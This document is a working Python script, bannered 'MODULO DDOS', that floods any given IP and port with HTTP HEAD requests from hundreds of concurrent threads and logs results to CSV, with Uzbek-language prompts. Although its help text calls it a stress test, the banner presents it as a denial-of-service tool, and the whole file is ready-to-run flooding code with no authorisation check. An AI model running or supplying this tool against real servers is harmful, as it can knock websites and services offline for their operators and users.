import urllib3
import csv
import time
import sys
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
SUCCESS, ERROR, INFO = Fore.GREEN, Fore.RED, Fore.CYAN
HIGHLIGHT, MUTED = Fore.MAGENTA, Fore.LIGHTBLACK_EX
REAL_ORANGE = "\033[38;2;255;140;0m"
BRIGHT_GREEN = "\033[38;5;82m"

stats_data = []
stats_lock = threading.Lock()
print_lock = threading.Lock()

def print_banner():
    banner = f"""
{REAL_ORANGE}
███╗   ███╗ ██████╗ ██████╗ ██╗   ██╗██╗      ██████╗     ██████╗ ██████╗  ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗██║   ██║██║     ██╔═══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██╔████╔██║██║   ██║██║  ██║██║   ██║██║     ██║   ██║    ██║  ██║██║  ██║██║   ██║███████╗
██║╚██╔╝██║██║   ██║██║  ██║██║   ██║██║     ██║   ██║    ██║  ██║██║  ██║██║   ██║╚════██║
██║ ╚═╝ ██║╚██████╔╝██████╔╝╚██████╔╝███████╗╚██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝     ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝

{Style.DIM}{Fore.WHITE}by Salohiddinov{Style.RESET_ALL}
"""
    print(banner)

def send_request(pool, url, req_id, timeout=2):
    """Send a single request and measure latency"""
    start_time = time.perf_counter()
    http_code = 0
    outcome = "failed"
    
    try:
        response = pool.request(
            'HEAD',
            url,
            timeout=urllib3.Timeout(connect=timeout, read=timeout),
            retries=False,
            headers={
                'Connection': 'close',
                'User-Agent': 'Mozilla/5.0'
            }
        )
        http_code = response.status
        outcome = "success"
        status = "success"
    except urllib3.exceptions.TimeoutError:
        status = "TIMEOUT"
    except urllib3.exceptions.ConnectionError:
        status = "CONNECTION_ERROR"
    except Exception as e:
        status = f"ERROR:{str(e)[:20]}"
    
    latency = time.perf_counter() - start_time
    
    # Thread-safe printing and data collection
    with print_lock:
        if outcome == "success":
            sys.stdout.write(f"{SUCCESS}[+]{Style.RESET_ALL} #{req_id:05} {MUTED}{latency:.4f}s{Style.RESET_ALL} STATUS={http_code}\n")
        else:
            sys.stdout.write(f"{ERROR}[-]{Style.RESET_ALL} #{req_id:05} {ERROR}{status}{Style.RESET_ALL}\n")
        sys.stdout.flush()
    
    with stats_lock:
        stats_data.append({
            "request_id": req_id,
            "timestamp": datetime.now().strftime("%H:%M:%S.%f"),
            "latency_sec": round(latency, 4),
            "http_status": http_code,
            "outcome": outcome,
            "error": status if outcome == "failed" else ""
        })
    
    return outcome, latency, http_code

def run_stress_test(target_ip, target_port, total_reqs, workers=500, batch_size=50):
    """Run stress test using ThreadPoolExecutor with connection pooling"""
    url = f"http://{target_ip}:{target_port}/"
    
    # Create connection pool with optimized settings
    pool = urllib3.PoolManager(
        num_pools=workers,
        maxsize=workers,
        block=False,
        timeout=urllib3.Timeout(connect=2.0, read=2.0),
        retries=0
    )
    
    print(f"{INFO}{Style.BRIGHT}Nishon:{Fore.MAGENTA} {url}")
    print(f"{INFO}{Style.BRIGHT}Jami so'rovlar:{Fore.RESET} {total_reqs}")
    print(f"{INFO}{Style.BRIGHT}Ishchilar:{Fore.RESET} {workers}")
    print(f"{INFO}{Style.BRIGHT}To'plam hajmi:{Fore.RESET} {batch_size}\n")
    
    start_bench = time.perf_counter()
    completed = 0
    success_count = 0
    fail_count = 0
    
    # Process requests in batches for better memory management
    for batch_start in range(0, total_reqs, batch_size):
        batch_end = min(batch_start + batch_size, total_reqs)
        batch_ids = list(range(batch_start, batch_end))
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            # Submit batch of requests
            future_to_id = {
                executor.submit(send_request, pool, url, req_id): req_id 
                for req_id in batch_ids
            }
            
            # Process results as they complete
            for future in as_completed(future_to_id):
                req_id = future_to_id[future]
                try:
                    outcome, latency, http_code = future.result()
                    completed += 1
                    if outcome == "success":
                        success_count += 1
                    else:
                        fail_count += 1
                except Exception as e:
                    print(f"{ERROR}Kutilmagan xato #{req_id}: {e}")
                    fail_count += 1
                    completed += 1
                
                # Progress indicator
                if completed % 100 == 0 or completed == total_reqs:
                    progress = (completed / total_reqs) * 100
                    sys.stdout.flush()
    
    # Final statistics
    end_bench = time.perf_counter()
    total_time = end_bench - start_bench
    rps = total_reqs / total_time if total_time > 0 else 0
    success_rate = (success_count / total_reqs * 100) if total_reqs > 0 else 0
    
    print('\n')
    print(f"{INFO}Umumiy vaqt:       {total_time:.2f} soniya")
    print(f"{INFO}Jami so'rovlar:    {total_reqs}")
    print(f"{INFO}Muvaffaqiyatli:    {SUCCESS}{success_count}{Style.RESET_ALL}")
    print(f"{INFO}Xatoliklar:        {ERROR}{fail_count}{Style.RESET_ALL}")
    print(f"{BRIGHT_GREEN if rps > 1000 else SUCCESS}O'rtacha tezlik:   {rps:.2f} so'rov/soniya{Style.RESET_ALL}")
    print(f"{INFO}Maksimal o'tkazish: {(success_count/total_time):.2f} muvaffaqiyatli/soniya{Style.RESET_ALL}")
    print('\n')

def save_to_csv(filename):
    """Save test results to CSV file"""
    if not stats_data:
        print(f"{ERROR}Ma'lumot topilmadi")
        return
    
    with stats_lock:
        keys = stats_data[0].keys()
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            writer.writerows(stats_data)
    
    print(f"{SUCCESS}Ma'lumot saqlandi: {HIGHLIGHT}{filename}{Style.RESET_ALL}")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Yuqori samarali HTTP stress test vositasi')
    parser.add_argument("--ip", required=True, help="Nishon IP manzili")
    parser.add_argument("--port", type=int, default=80, help="Nishon port (default: 80)")
    parser.add_argument("--requests", type=int, default=100, help="Jami so'rovlar soni (default: 100)")
    parser.add_argument("--workers", type=int, default=500, help="Bir vaqtda ishlaydigan ishchilar soni (default: 500)")
    parser.add_argument("--batch", type=int, default=50, help="To'plam hajmi (default: 50)")
    parser.add_argument("--output", default="result.csv", help="Chiqish CSV fayl nomi")
    
    args = parser.parse_args()
    
    print_banner()
    
    try:
        run_stress_test(
            target_ip=args.ip,
            target_port=args.port,
            total_reqs=args.requests,
            workers=args.workers,
            batch_size=args.batch
        )
    except KeyboardInterrupt:
        print(f"\n{ERROR}Test foydalanuvchi tomonidan to'xtatildi")
    except Exception as e:
        print(f"{ERROR}Xato: {e}")
    finally:
        save_to_csv(args.output)